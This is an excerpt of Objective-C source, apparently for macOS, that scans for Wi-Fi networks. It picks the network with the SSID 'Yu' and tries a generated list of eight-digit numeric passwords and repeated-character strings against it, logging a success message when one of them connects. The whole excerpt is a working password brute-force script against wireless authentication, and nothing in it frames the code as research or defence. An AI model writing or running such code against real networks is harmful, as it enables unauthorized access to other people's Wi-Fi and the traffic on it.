...
- (NSArray*) book
{
    ...
    for (int i=0; i<100000; i++){
        [arr addObject:[NSString stringWithFormat:@"%0.8d", i]];
...
{
    NSLog(@"begin");
    NSArray* password_book = @[@"11111111", @"22222222", @"33333333", @"44444444", @"55555555", @"66666666", @"77777777", @"88888888", @"99999999", @"00000000", @"87654321", @"aaaaaaaa", @"bbbbbbbb", @"cccccccc", @"dddddddd", @"eeeeeeee", @"ffffffff", @"gggggggg", @"hhhhhhhh",@"iiiiiiii",@"jjjjjjjj",@"kkkkkkkk",@"llllllll",@"mmmmmmmm",@"nnnnnnnn",@"oooooooo", @"pppppppp",@"qqqqqqqq",@"rrrrrrrr",@"ssssssss",@"tttttttt",@"uuuuuuuu",@"vvvvvvvv",@"wwwwwwww",@"xxxxxxxx",@"yyyyyyyy",@"zzzzzzzz"];
    password_book = [self book];
    
    self.currentInterface = [CWInterface interfaceWithName:@"en1"];
    [self scan];
    for (CWNetwork* network in self.scanResults) {
        if (![network.ssid isEqualToString: @"Yu"]){
            continue;
        }
        for (NSString* password in password_book) {
            [self connectToNetwork:network WithPassword:password];
        }
    }
...
{
    NSError *err = nil;
	NSDictionary *params = [NSDictionary dictionaryWithObject:[NSNumber numberWithBool:NO] forKey:kCWScanKeyMerge];
	self.scanResults = [NSMutableArray arrayWithArray:[self.currentInterface scanForNetworksWithParameters:params error:&err]];
}

- (void)connectToNetwork:(CWNetwork *)network WithPassword:(NSString*)password
{
...
//	user8021XProfile.ssid = network.ssid;
//	user8021XProfile.userDefinedName = network.ssid;
//	user8021XProfile.username = nil;
//    user8021XProfile.password = @"password";
//
...
//    else
    ...
    if (network.rssi.integerValue<-85){
        NSLog(@"%@ %@ %@ skip", network.ssid, network.rssi, password);
        return;
    }
    BOOL result = [self.currentInterface associateToNetwork:network password:password error:&err];

    if( !result )
        NSLog(@"%@ %@ %@ %@", network.ssid, network.rssi, password, err.localizedDescription);
    else{
        NSLog(@"%@ %@ correct!!!!!!!!!!!!!",network.ssid, password);
